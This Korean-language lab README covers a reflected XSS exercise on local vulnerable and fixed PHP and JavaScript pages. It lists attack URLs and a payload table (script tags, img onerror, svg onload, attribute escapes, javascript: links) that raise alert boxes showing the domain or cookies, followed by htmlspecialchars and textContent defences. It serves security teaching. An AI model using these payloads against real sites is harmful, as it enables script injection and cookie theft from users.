# 01. Reflected XSS 실습

> xss.md 연결: 3장 (반사형 XSS), 2장 (URI, Input Forms 공격 지점)

## 실행 방법

### PHP 버전
```bash
# 취약 버전
php -S localhost:8080 -t xss/01-reflected/vulnerable/php/
# 브라우저: http://localhost:8080/search.php

# 안전 버전
php -S localhost:8080 -t xss/01-reflected/secure/php/
# 브라우저: http://localhost:8080/search_safe.php
```

### Vanilla JS 버전
```bash
# 브라우저에서 직접 열기
open xss/01-reflected/vulnerable/js/index.html
open xss/01-reflected/secure/js/index_safe.html
```

## 공격 방법

### R-01. PHP search.php - GET 파라미터 반사

**취약 코드**: `echo "<p>검색 결과: " . $_GET['q'] . "</p>";`

**공격 URL**:
```
http://localhost:8080/search.php?q=<script>alert(document.domain)</script>
http://localhost:8080/search.php?q=<img src=x onerror=alert(document.cookie)>
http://localhost:8080/search.php?q=<svg onload=alert(1)>
```

**속성값 탈출 (input value 속성)**:
```
http://localhost:8080/search.php?q=" autofocus onfocus=alert(1) x="
```
→ value="" 속성을 탈출하여 이벤트 핸들러 삽입

### R-02. PHP search.php - 에러 메시지 반사

```
http://localhost:8080/search.php?id=<script>alert(1)</script>
```

### R-03. Vanilla JS index.html - location.search 기반

```
index.html?name=<img src=x onerror=alert(document.domain)>
index.html?name=<svg onload=alert(1)>
```

**포인트**: PHP 서버 없이도 반사형 XSS 발생. URL을 공유하면 피해자가 클릭 시 즉시 실행.

## 페이로드 모음

| 목적 | 페이로드 |
|---|---|
| 기본 동작 확인 | `<script>alert(document.domain)</script>` |
| 쿠키 탈취 확인 | `<script>alert(document.cookie)</script>` |
| 이미지 태그 | `<img src=x onerror=alert(1)>` |
| 속성값 탈출 | `" onmouseover=alert(1) x="` |
| 링크 태그 | `<a href="javascript:alert(1)">XSS</a>` |

## 방어 원리

**PHP**: `htmlspecialchars($input, ENT_QUOTES, 'UTF-8')`
- `<` → `&lt;`
- `>` → `&gt;`
- `"` → `&quot;`
- `'` → `&#039;`

**JS**: `element.textContent = input` (innerHTML 대신)

## Reflected XSS의 특징

- URL에 페이로드 포함 → 피해자에게 URL을 클릭하게 유도 (피싱 이메일 등)
- 서버 응답에 스크립트 포함되지만 DB에 저장되지 않음
- **피해 범위**: URL을 클릭한 사람만 (Stored XSS와 차이점)
